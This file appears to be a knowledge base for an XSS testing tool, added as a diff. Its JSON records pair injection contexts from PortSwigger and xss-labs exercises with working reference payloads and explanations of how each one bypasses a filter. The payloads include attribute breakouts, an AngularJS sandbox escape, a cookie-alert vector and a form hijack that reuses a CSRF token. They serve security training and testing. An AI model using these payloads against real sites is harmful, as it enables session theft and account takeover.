@@ -1,0 +1,195 @@
+[
+  {
+    "id": "portswigger-js-string",
+    "context": "反射型 XSS，注入点落在 JS 代码块的字符串 var searchTerms = '...'，尖括号被 HTML 编码但单引号未转义",
+    "reference_payload": "-alert(1)-",
+    "principle": "JS 字符串 breakout",
+    "source": "portswigger"
+  },
+  {
+    "id": "portswigger-dom-document-write",
+    "context": "DOM-based XSS，sink 是 document.write 写入 location.search 的值，尖括号未被 HTML 编码",
+    "reference_payload": "\"><svg onload=alert(1)>",
+    "principle": "document.write sink",
+    "source": "portswigger"
+  },
+  {
+    "id": "portswigger-attribute-double-quote",
+    "context": "反射型 XSS，注入点落在属性值 value=\"...\" 内，双引号未转义，尖括号被 HTML 编码",
+    "reference_payload": "\"><script>alert(1)</script>",
+    "principle": "属性双引号 breakout",
+    "source": "portswigger"
+  },
+  {
+    "id": "auto-20261013001824",
+    "context": "xss-labs level2：GET/表单 keyword 反射进 <input value=\"...\"> 属性内",
+    "reference_payload": "\"><script>alert(1)</script>",
+    "principle": "属性上下文闭合引号 + 闭合 input 标签后注入 script",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level2.php?keyword={payload}"
+  },
+  {
+    "id": "auto-20261013003327",
+    "context": "xss-labs level4：反射点落在 input 的 value 属性内（value=\"$keyword\"），`\"` 未被编码可闭合属性，但 `<` 和 `>` 被剥离（无法注入新标签），因此需用事件属性内联注入；且需自动触发事件（onmouseover 需交互，黑盒 verify 不触发）。",
+    "reference_payload": "aaa\" autofocus onfocus=confirm(1) x=\"",
+    "principle": "属性闭合 + 事件属性注入 + autofocus/onfocus 自触发",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level4.php?keyword=aaa%22%20autofocus%20onfocus%3Dconfirm(1)%20x%3D%22"
+  },
+  {
+    "id": "auto-20261012172252",
+    "context": "xss-labs level6：keyword 反射进 input 双引号 value；过滤对 `<script`/`on`/`src`/`href`/`data` 做**大小写敏感**替换（插 `_`）",
+    "reference_payload": "\"><SCRIPT>alert(1)</SCRIPT>",
+    "principle": "大小写混淆绕过：大写 <SCRIPT> 避开小写匹配的过滤器",
+    "source": "xss-labs"
+  },
+  {
+    "id": "auto-20261012030906",
+    "context": "level8.php：GET 参数 keyword 反射进两处——① `<input name=keyword value=\"...\">`：htmlspecialchars(ENT_COMPAT)，& < > \" 被转义，属性用双引号 → 无法 breakout；② `<a href=\"...\">友情链接</a>`：服务端先 strtolower，再对 script/src/on/href/data 插下划线（script→scr_ipt 等），并把 `\"` 替换为无分号 `&quot` → 引号内无法逃逸。两个 sink 都在双引号属性内，唯一通路是 href 的 javascript: 伪协议，必须交互（点击）才能执行。",
+    "reference_payload": "keyword=java&#115;cript:alert(1)（URL 编码：java%26%23115%3Bcript%3Aalert(1)），点击页面里的「友情链接」链接后弹窗",
+    "principle": "HTML 实体绕过关键词过滤（script→scr&#105;pt）+ href javascript: 伪协议点击型；自动导航 verify 覆盖不到交互型，需人工触发确认",
+    "source": "xss-labs"
+  },
+  {
+    "id": "auto-20261012032401",
+    "context": "level10.php：只有 t_sort 参数回填进 `<input name=\"t_sort\" value=\"...\" type=\"hidden\">`（keyword 只进文本节点）。t_sort 过滤：`<` 和 `>` 被删除，但 `\"` `'` `&` `(` `)` 原样未转义 → 可用 `\"` 跳出 value 属性，但无法新建标签（无 `<>`），只能给该 input 挂属性/事件。",
+    "reference_payload": "t_sort = `\" type=\"image\" src=x onerror=\"alert(1)` → 渲染为 `<input value=\"\" type=\"image\" src=x onerror=\"alert(1)\" type=\"hidden\">`（首个 type=image 生效，坏 src 自动触发 onerror）",
+    "principle": "属性注入（值内 `\"` 未转义）+ 无交互自动触发（input type=image src=x onerror；headless 下 autofocus+onfocus 不触发）",
+    "source": "xss-labs"
+  },
+  {
+    "id": "auto-20261012040941",
+    "context": "level15.php：AngularJS（ng-app）页面，src 参数被拼进 class：`<span class=\"ng-include:test\"></span>`。ng-include 指令通过 class 触发，会把表达式求值结果当作模板 URL 加载并插入 DOM。",
+    "reference_payload": "src = `'level1.php?name=<img src=x onerror=alert(1)>'` → ng-include 加载 level1.php（其 name 参数未转义反射）→ 插入 `<img src=x onerror=alert(1)>` 执行",
+    "principle": "AngularJS ng-include 指令经 class 属性注入 + 同源反射页作为模板载体（把 XSS 反射点当 ng-include 的 URL，借 Angular 把 HTML 插入 DOM 触发事件）",
+    "source": "xss-labs"
+  },
+  {
+    "id": "auto-20261012173156",
+    "context": "xss-labs level17：arg01/arg02 拼进 <embed src=xsf01.swf?a=b ...> 的未加引号 src 属性值；`<`/`>` 被 htmlspecialchars 转义，无法逃出标签",
+    "reference_payload": "b onmouseover=alert(1)",
+    "principle": "未加引号属性值注入：用空格分隔注入 onmouseover 事件属性，鼠标悬停人工触发（无自动触发路径）",
+    "source": "xss-labs"
+  },
+  {
+    "id": "auto-20261010233710",
+    "context": "GET 参数 search（首页搜索框）反射进 HTML 文本节点，无任何编码/过滤，服务端直接回显原始输入。",
+    "reference_payload": "<script>alert(1)</script>",
+    "principle": "HTML 文本节点上下文 / 无编码直接注入 script",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261010234041",
+    "context": "GET 参数 search（首页搜索框）。输入有第二落点：由客户端 JS 把 location.search 未编码拼接进 HTML 的属性值内（探针 \"><b>marker</b> 的 <b> 被解析成 DOM，证明双引号属性上下文可 breakout）。",
+    "reference_payload": "\"><img src=x onerror=alert(1)>",
+    "principle": "DOM XSS / 客户端 sink 拼接 location.search / 属性值双引号 breakout / 事件处理器绕 script 不执行",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261010234658",
+    "context": "GET 参数 returnPath（/feedback 页）。客户端用 jQuery 把 returnPath 原样写入页面 Back 链接的 href（探针 returnPath=/post?postId=3 → Back 的 href 精确变为 /post?postId=3，确认 sink）。该 sink 不会自动触发，javascript: 伪协议需用户点击链接才执行。",
+    "reference_payload": "javascript:alert(1)",
+    "principle": "DOM XSS / jQuery 写 anchor href / javascript: 伪协议 / 需用户点击（无自动执行）",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011002057",
+    "context": "GET 参数 search。反射落在 <input> 的双引号属性值内（value=\"...\"），其中双引号未编码（可 breakout），但 < > 被 HTML 编码为 &lt;&gt;（同一输入在 h1 文本节点里则全部字符都被实体编码）。因角度括号被编码，无法构造新标签。",
+    "reference_payload": "\" autofocus onfocus=alert(1) x=\"",
+    "principle": "属性值上下文 breakout / 角度括号 HTML 编码绕过 / autofocus+onfocus 无交互执行",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011121924",
+    "context": "反射点在首页 search 参数的搜索结果页，搜索词被拼进 <script> 块里的 JS 字符串（var searchTerms = '...';），单引号未编码，但尖括号 < > 被 HTML 编码，无法插入 <script> 标签。",
+    "reference_payload": "'-alert(1)-'",
+    "principle": "JS 字符串 breakout / 单引号闭合",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011133034",
+    "context": "博客首页 search 参数反射进 ng-app 作用域（文本节点），尖括号和双引号被 HTML 编码，无法用标签/属性 breakout。",
+    "reference_payload": "{{$on.constructor('alert(1)')()}}",
+    "principle": "AngularJS 表达式注入 + 绕过尖括号/双引号编码",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011133755",
+    "context": "博客评论表单 comment 字段内容存入服务端后由客户端 JS 用 innerHTML 渲染；渲染前只对输入中第一个 < 和第一个 > 做 HTML 转义（replace 非全局），属存储型 DOM XSS。",
+    "reference_payload": "<><img src=1 onerror=alert(1)>",
+    "principle": "stored DOM XSS + 非全局 replace 绕过（首字符消耗）",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011151009",
+    "context": "反射点：博客首页 GET /?search= 的值直接落入 HTML 文本节点。WAF 屏蔽所有标准标签（返回 \"Tag is not allowed\"）及部分属性（如 onload → \"Attribute is not allowed\"），但放行自定义标签 <xss> 与 style/onfocus/tabindex 等属性。要求自动调用 alert(document.cookie)。",
+    "reference_payload": "<xss id=x onfocus=alert(document.cookie) tabindex=1>  并以 URL fragment  #x 自动聚焦该元素触发 onfocus（经 exploit server 以 location='...?search=...%3E#x' 投递）",
+    "principle": "自定义标签 + URL fragment 自动聚焦 onfocus 触发（非 content-visibility）",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011160652",
+    "context": "反射点：首页 <link rel=\"canonical\" href='https://lab/?search=INPUT'/> 的属性值内。尖括号被转义，但单引号未转义，可直接逃逸 href 属性并注入新属性。",
+    "reference_payload": "?search='accesskey='x'onclick='alert(1)   → 注入 accesskey/onclick 到 link 元素，受害者按 ALT+SHIFT+X 触发 onclick（Chrome 专用，需按键交互）",
+    "principle": "属性逃逸 + accesskey 键盘快捷键触发 onclick（无需事件自动触发）",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011182159",
+    "context": "反射点落在内联 <script> 的 JS 字符串字面量里（如 var searchTerms = 'INPUT';）。服务端对 < > 和双引号做 HTML 实体编码，对单引号做「加反斜杠」转义。",
+    "reference_payload": "\\';alert(1)//",
+    "principle": "JS 字符串 breakout（反斜杠吃掉转义反斜杠）",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011185422",
+    "context": "反射点落在内联 <script> 的 JS 模板字面量里（反引号包围，形如 var searchTerms = `INPUT`;）。尖括号、单引号、双引号、反斜杠、反引号全部被 Unicode 转义（如 \\u003c）。",
+    "reference_payload": "${alert(1)}",
+    "principle": "模板字面量 ${} 表达式插值（无需闭合反引号）",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261011203408",
+    "context": "PortSwigger \"Reflected XSS with AngularJS sandbox escape without strings\"。反射点 /?search= 的值被拼进 HTML 并被 AngularJS 当作表达式求值（ng-app）。限制：无法使用字符串字面量（引号被过滤/不可用），且需突破 AngularJS 沙箱。",
+    "reference_payload": "?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1",
+    "principle": "AngularJS 沙箱逃逸 + 无字符串构造（constructor.prototype.charAt=[].join 绕过 sandbox 的 hasOwnProperty 检查，fromCharCode 拼出 x=alert(1)，经 orderBy filter 作为表达式求值执行）",
+    "source": "portswigger"
+  },
+  {
+    "id": "auto-20261011214408",
+    "context": "PortSwigger \"Reflected XSS with event handlers and href attributes blocked\"（EXPERT）。反射点 /?search= 的值原样插入 HTML（无编码），但服务端白名单过滤标签、并拦截所有 on* 事件处理器属性和 a 标签的 href 属性。要求：构造一个被点击时执行 alert 的向量，且向量文本须含 \"Click\" 以诱导模拟用户点击。",
+    "reference_payload": "?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>",
+    "principle": "属性过滤绕过：href 属性被拦，但用 SVG <animate attributeName=href values=javascript:alert(1)> 在运行时动态把 href 设为 javascript: URI，绕过对静态 href 属性的检查；配合 <text>Click me</text> 诱导点击",
+    "source": "portswigger"
+  },
+  {
+    "id": "auto-20261011225332",
+    "context": "反射点：`/my-account?email=<value>`，email 参数被原样（未 HTML 转义）反射进 change-email 表单的 `<input required type=\"email\" name=\"email\" value=\"...\">` 属性（双引号内）。该 input 之后紧跟同一表单的 `<input type=\"hidden\" name=\"csrf\" value=TOKEN>`。站点有严格 CSP（default-src 'self'，禁止加载外部子资源）。因此可注入标签并复用原表单自带的 CSRF token 直接提交 change-email。",
+    "reference_payload": "hacker@evil-user.net\"><button type=\"submit\">Click</button>  （URL 编码：hacker%40evil-user.net%22%3E%3Cbutton%20type%3D%22submit%22%3EClick%3C%2Fbutton%3E）",
+    "principle": "属性内未转义反射 + 表单劫持：breakout 后把注入的 submit 按钮留在原 <form> 内，点击即用该表单自带的 CSRF token 提交 POST /my-account/change-email",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261012010019",
+    "context": "反射点在 /my-account?email= 的 <input type=email value=\"...\">，双引号与尖括号未转义（可属性 breakout 并注入 HTML 标签）；同表单内含 hidden csrf，form action=/my-account/change-email。页面 CSP 严格：default-src 'self' 等，禁 inline script 与外部子资源，但同源 form 提交/导航不受限。",
+    "reference_payload": "email=hacker%40evil-user.net%22%3E%3Cbutton%20type%3D%22submit%22%3EClick%3C%2Fbutton%3E （配合 exploit-server Body 内联 <script>location=... 重定向受害者到该注入页，受害者点击注入的 submit 按钮，借用页面自带 csrf 提交表单改邮箱）",
+    "principle": "strict CSP 下的属性 breakout + form hijacking（dangling markup），借用页面自带 CSRF token 提交，非脚本执行",
+    "source": "auto"
+  },
+  {
+    "id": "auto-20261013003513",
+    "context": "反射点落在 <input value=\"...\"> 属性内；文本区对 \" < > 做 HTML 实体转义，但 value 属性区原样输出（引号/尖括号可闭合）。后端对输入做黑名单替换：'on' -> 'o_n'（大小写不敏感）、首个 'script' -> 'scr_ipt'，用于破坏事件处理器与 script 标签。'alert' 不含 on/script 保留可用。",
+    "reference_payload": "\"><iframe src=\"javascript:alert(1)\">",
+    "principle": "黑名单只杀 on*/script，绕开：闭合 value 属性后用 <iframe src=\"javascript:...\">，该向量不含 on 也不含 script，且 javascript: 伪协议自动执行无需交互",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level5.php?keyword={payload}&submit=submit"
+  },
+  {
+    "id": "auto-20261013005944",
+    "context": "反射型 XSS：arg01 被拼进 <embed src=xsf01.swf?<arg01>= ...>，处于无引号属性值内；< > \" 均被 HTML 实体转义，无法闭合标签/注入新标签，只能在 embed 标签内追加属性；且 verify 不产生鼠标交互，onmouseover/onclick 等交互事件测不到",
+    "reference_payload": " autofocus onfocus=alert(1) x",
+    "principle": "无引号属性注入 + autofocus 自动聚焦触发 onfocus（自触发，无需鼠标），末尾加 dummy 属性吞掉模板尾随的 =",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level17.php?arg01=%20autofocus%20onfocus%3Dalert(1)%20x"
+  }
+]
